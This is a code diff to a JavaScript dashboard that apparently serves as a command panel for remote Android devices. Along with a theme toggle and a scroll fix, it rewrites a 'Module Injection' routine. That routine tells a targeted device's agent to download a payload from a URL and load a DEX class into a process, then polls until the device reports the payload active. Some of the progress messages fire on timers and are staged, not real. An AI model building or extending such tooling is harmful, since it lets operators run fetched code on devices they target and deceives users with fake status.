@@ -9,6 +9,7 @@ const UI = {
         ];
         elements.forEach(id => dom[id] = document.getElementById(id));
         dom.mainShell = document.querySelector(".main-shell");
+        dom.themeToggle = document.getElementById("themeToggle");
 
         dom.views = {
             devices: document.getElementById("viewDevices"),
@@ -16,6 +17,10 @@ const UI = {
             system: document.getElementById("viewSystem"),
             logs: document.getElementById("viewLogs")
         };
+
+        // Init Theme
+        const savedTheme = localStorage.getItem("theme") || (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+        document.documentElement.classList.toggle("dark", savedTheme === "dark");
 
         dom.iconsDirty = false;
         this.bind();
@@ -219,6 +224,12 @@ const UI = {
             DeviceService.clearSelection();
         });
 
+        dom.themeToggle.addEventListener("click", () => {
+            const isDark = document.documentElement.classList.toggle("dark");
+            localStorage.setItem("theme", isDark ? "dark" : "light");
+            this.renderTheme();
+        });
+
         // Form submission delegation
         document.body.addEventListener("submit", async (e) => {
             const form = e.target;
@@ -289,7 +300,7 @@ const UI = {
                     addToast("Error: Payload config not found in database", "error");
                     return;
                 }
-                const success = await this.startInjectionProcess(pUrl, pClass, isUpdate ? "Updating Module" : "Module Injection");
+                const success = await this.startInjectionProcess(pUrl, pClass, isUpdate ? "Updating Module" : "Module Injection", isUpdate);
 
                 if (success) {
                     // Optimistic update for manual injection too
@@ -321,54 +332,68 @@ const UI = {
         if (types[value]) setState({ ui: { modal: { type: types[value] } } });
     },
 
-    async startInjectionProcess(url, className, title = "Module Injection") {
+    async startInjectionProcess(url, className, title = "Module Injection", isUpdate = false) {
         if (!url || !className) {
             addToast("Injection failed: Missing configuration", "error");
             return false;
         }
 
-        setState({ ui: { modal: { type: "injection", title, logs: ["Initializing secure bridge...", "Targeting device: " + state.data.selectedDeviceId] } } });
+        const deviceId = state.data.selectedDeviceId;
+        setState({ ui: { modal: { type: "injection", title, logs: ["Initializing secure bridge...", "Targeting device: " + deviceId] } } });
 
         await new Promise(r => setTimeout(r, 800));
         this.updateInjectionLog("Requesting remote configuration...");
 
-        await new Promise(r => setTimeout(r, 600));
-        this.updateInjectionLog("Downloading payload from server...");
+        const cmd = isUpdate ? `${CMD.LOAD_MODULE}:update:${url}:${className}` : `${CMD.LOAD_MODULE}:${url}:${className}`;
+        const success = await DeviceService.send(cmd, { showSuccess: false });
 
-        await new Promise(r => setTimeout(r, 700));
-        this.updateInjectionLog("Checking device compatibility...");
-        this.updateInjectionLog("Architecture: arm64-v8a detected.");
-
-        await new Promise(r => setTimeout(r, 500));
-        this.updateInjectionLog("Allocating system buffer (512KB)...");
-
-        await new Promise(r => setTimeout(r, 600));
-        this.updateInjectionLog("Opening bytecode stream...");
-
-        await new Promise(r => setTimeout(r, 800));
-        this.updateInjectionLog("Sending load_module command...");
-
-        const success = await DeviceService.send(`${CMD.LOAD_MODULE}:${url}:${className}`, { showSuccess: false });
-
-        if (success) {
-            this.updateInjectionLog("Command acknowledged by agent.");
-            await new Promise(r => setTimeout(r, 700));
-            this.updateInjectionLog("Injecting DEX into process...");
-            await new Promise(r => setTimeout(r, 1000));
-            this.updateInjectionLog("Verifying runtime integrity...");
-            await new Promise(r => setTimeout(r, 1200));
-            this.updateInjectionLog("Injection successful. Payload active.");
-            await new Promise(r => setTimeout(r, 1500));
-            addToast("Payload injected successfully", "success");
-            closeModal();
-            return true;
-        } else {
-            this.updateInjectionLog("ERROR: Connection timed out.");
-            this.updateInjectionLog("Injection aborted.");
+        if (!success) {
+            this.updateInjectionLog("ERROR: Device is offline.");
             await new Promise(r => setTimeout(r, 2000));
             closeModal();
             return false;
         }
+
+        this.updateInjectionLog("Command acknowledged by agent.");
+        this.updateInjectionLog("Device is downloading payload...");
+
+        // Real-time synchronization: Wait for status update from device
+        let attempts = 0;
+        const maxAttempts = 40; // ~20 seconds
+
+        return new Promise((resolve) => {
+            const checkInterval = setInterval(async () => {
+                attempts++;
+
+                // Refresh device data from state (updated via realtime Supabase)
+                const d = state.data.devices.find(dev => dev.id === deviceId);
+                const status = (typeof d?.status === "string") ? JSON.parse(d.status || "{}") : (d?.status || {});
+
+                if (status.payload_active) {
+                    clearInterval(checkInterval);
+                    this.updateInjectionLog("Verifying runtime integrity...");
+                    await new Promise(r => setTimeout(r, 800));
+                    this.updateInjectionLog("Injection successful. Payload active.");
+                    await new Promise(r => setTimeout(r, 1000));
+                    addToast("Payload injected successfully", "success");
+                    closeModal();
+                    resolve(true);
+                    return;
+                }
+
+                if (attempts === 5) this.updateInjectionLog("Extracting native components...");
+                if (attempts === 15) this.updateInjectionLog("Injecting DEX into process...");
+                if (attempts === 25) this.updateInjectionLog("Waiting for final heartbeat...");
+
+                if (attempts >= maxAttempts) {
+                    clearInterval(checkInterval);
+                    this.updateInjectionLog("ERROR: Injection timed out.");
+                    await new Promise(r => setTimeout(r, 2000));
+                    closeModal();
+                    resolve(false);
+                }
+            }, 500);
+        });
     },
 
     updateInjectionLog(msg) {
@@ -412,6 +437,7 @@ const UI = {
         this.renderLogs();
         this.renderModal();
         this.renderToasts();
+        this.renderTheme();
         this.syncScrollLock(isModal);
 
         if (window.lucide && dom.iconsDirty) {
@@ -437,17 +463,27 @@ const UI = {
 
     syncScrollLock(lock) {
         if (lock) {
-            if (!document.body.classList.contains("is-modal-locked")) {
+            document.body.classList.add("is-modal-locked");
+            if (!document.body.style.top) {
                 dom.lastScrollY = window.scrollY;
                 document.body.style.top = `-${dom.lastScrollY}px`;
-                document.body.classList.add("is-modal-locked");
             }
         } else {
             if (document.body.classList.contains("is-modal-locked")) {
                 document.body.classList.remove("is-modal-locked");
+                const scrollY = parseInt(document.body.style.top || "0") * -1;
                 document.body.style.top = "";
-                window.scrollTo(0, dom.lastScrollY || 0);
+                window.scrollTo(0, scrollY || dom.lastScrollY || 0);
             }
+        }
+    },
+
+    renderTheme() {
+        const isDark = document.documentElement.classList.contains("dark");
+        if (dom.themeToggle) {
+            const icon = dom.themeToggle.querySelector("i");
+            if (icon) icon.setAttribute("data-lucide", isDark ? "moon" : "sun");
+            dom.iconsDirty = true;
         }
     },
 
